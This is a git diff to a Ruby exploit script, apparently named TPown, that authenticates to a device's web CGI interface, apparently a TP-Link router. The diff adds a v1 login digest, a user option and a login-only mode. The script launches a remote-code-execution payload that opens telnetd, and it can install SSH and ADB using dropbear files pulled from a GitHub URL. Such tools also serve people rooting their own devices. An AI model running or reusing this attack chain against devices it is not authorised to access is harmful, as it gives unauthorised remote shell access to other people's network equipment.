@@ -71,9 +71,11 @@ class TPown
 
         
         nonce = data["nonce"].to_s
-
-        digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:pass] + ":" + nonce)
-
+        if @options[:rce] == 1
+            digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:name] + ":" + @options[:pass] + ":" + nonce)
+        else
+            digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:pass] + ":" + nonce)
+        end
         login_data = {"module": "authenticator", "action": 1, "digest": digest}.to_json
 
         res = Curl.post("http://#{@options[:target]}/cgi-bin/#{@options[:cgi_path]}", login_data) do |http|
@@ -243,46 +245,23 @@ tp.options = Optimist::options do
     opt :adb, "Enable ADBD service"
     opt :keep, "Keep the telnetd payload"
     opt :pass, "Web interface password", type: String, required: true
+    opt :user, "Web interface user (for v1)", type: String
     opt :target, "Target IP", type: String, required: true
     opt :rce, "RCE version, 1, 5 or try to autodetect if left empty", type: Integer
     opt :dropbear_bin, "Dropbear binary location", default: "https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearmulti"
     opt :dropbear_init, "Dropbear init script location", default: "https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearserver.sh"
-
+    opt :login_only, "Only attempt to login and quit", default: false
     educate_on_error
     
 end
 
 tp.detect_version()
 tp.login()
+exit if tp.options[:login_only]
+
 tp.payload()
 tp.cleanup() unless tp.options[:keep]
 tp.ping_telnet()
 
 tp.install_adb() if tp.options[:adb]
 tp.install_ssh() if tp.options[:ssh]
-
-exit
-
-
-if tp.options[:version] == 5
-    tp.login("auth_cgi")
-    tp.payload_v5()
-    tp.cleanup_v5()
-
-end
-
-if tp.options[:version] == 1
-    tp.login("qcmap_auth")
-    tp.payload_v1()
-    tp.cleanup_v1()
-
-end
-
-if tp.options[:ssh]
-    tp.install_ssh
-end
-
-if tp.options[:adb]
-    tp.install_adb
-end
-
